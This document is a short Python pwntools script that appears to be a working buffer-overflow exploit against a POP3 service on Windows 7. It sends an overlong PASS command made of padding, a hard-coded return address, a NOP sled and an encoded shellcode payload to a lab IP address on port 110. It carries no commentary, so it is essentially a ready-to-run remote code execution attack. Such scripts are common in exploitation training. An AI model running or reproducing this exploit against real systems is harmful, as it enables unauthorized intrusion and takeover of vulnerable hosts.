"""
Tested on: Windows 7 x86
"""

from pwn import *

pad = cyclic(5000)
pad = b"A"*4654

buf =  b""
buf += b"\xd9\xf6\xbb\xbc\xf9\x98\x1f\xd9\x74\x24\xf4\x5a\x2b"
buf += b"\xc9\xb1\x52\x31\x5a\x17\x03\x5a\x17\x83\x7e\xfd\x7a"
buf += b"\xea\x82\x16\xf8\x15\x7a\xe7\x9d\x9c\x9f\xd6\x9d\xfb"
buf += b"\xd4\x49\x2e\x8f\xb8\x65\xc5\xdd\x28\xfd\xab\xc9\x5f"
buf += b"\xb6\x06\x2c\x6e\x47\x3a\x0c\xf1\xcb\x41\x41\xd1\xf2"
buf += b"\x89\x94\x10\x32\xf7\x55\x40\xeb\x73\xcb\x74\x98\xce"
buf += b"\xd0\xff\xd2\xdf\x50\x1c\xa2\xde\x71\xb3\xb8\xb8\x51"
buf += b"\x32\x6c\xb1\xdb\x2c\x71\xfc\x92\xc7\x41\x8a\x24\x01"
buf += b"\x98\x73\x8a\x6c\x14\x86\xd2\xa9\x93\x79\xa1\xc3\xe7"
buf += b"\x04\xb2\x10\x95\xd2\x37\x82\x3d\x90\xe0\x6e\xbf\x75"
buf += b"\x76\xe5\xb3\x32\xfc\xa1\xd7\xc5\xd1\xda\xec\x4e\xd4"
buf += b"\x0c\x65\x14\xf3\x88\x2d\xce\x9a\x89\x8b\xa1\xa3\xc9"
buf += b"\x73\x1d\x06\x82\x9e\x4a\x3b\xc9\xf6\xbf\x76\xf1\x06"
buf += b"\xa8\x01\x82\x34\x77\xba\x0c\x75\xf0\x64\xcb\x7a\x2b"
buf += b"\xd0\x43\x85\xd4\x21\x4a\x42\x80\x71\xe4\x63\xa9\x19"
buf += b"\xf4\x8c\x7c\x8d\xa4\x22\x2f\x6e\x14\x83\x9f\x06\x7e"
buf += b"\x0c\xff\x37\x81\xc6\x68\xdd\x78\x81\x56\x8a\x93\x54"
buf += b"\x3f\xc9\x93\x43\x0c\x44\x75\x01\x62\x01\x2e\xbe\x1b"
buf += b"\x08\xa4\x5f\xe3\x86\xc1\x60\x6f\x25\x36\x2e\x98\x40"
buf += b"\x24\xc7\x68\x1f\x16\x4e\x76\xb5\x3e\x0c\xe5\x52\xbe"
buf += b"\x5b\x16\xcd\xe9\x0c\xe8\x04\x7f\xa1\x53\xbf\x9d\x38"
buf += b"\x05\xf8\x25\xe7\xf6\x07\xa4\x6a\x42\x2c\xb6\xb2\x4b"
buf += b"\x68\xe2\x6a\x1a\x26\x5c\xcd\xf4\x88\x36\x87\xab\x42"
buf += b"\xde\x5e\x80\x54\x98\x5e\xcd\x22\x44\xee\xb8\x72\x7b"
buf += b"\xdf\x2c\x73\x04\x3d\xcd\x7c\xdf\x85\xfd\x36\x7d\xaf"
buf += b"\x95\x9e\x14\xed\xfb\x20\xc3\x32\x02\xa3\xe1\xca\xf1"
buf += b"\xbb\x80\xcf\xbe\x7b\x79\xa2\xaf\xe9\x7d\x11\xcf\x3b"

exploit = pad
exploit += p32(0x5f4a358f)
exploit +=  b"\x90"*20
exploit += buf

ip = "192.168.17.137"
s = remote(ip, 110)
s.recv(1024)
s.send('USER username' +'\r\n')
s.recv(1024)
s.send(b'PASS ' + exploit + b'\r\n')
s.recv(1024)
s.close()
s.close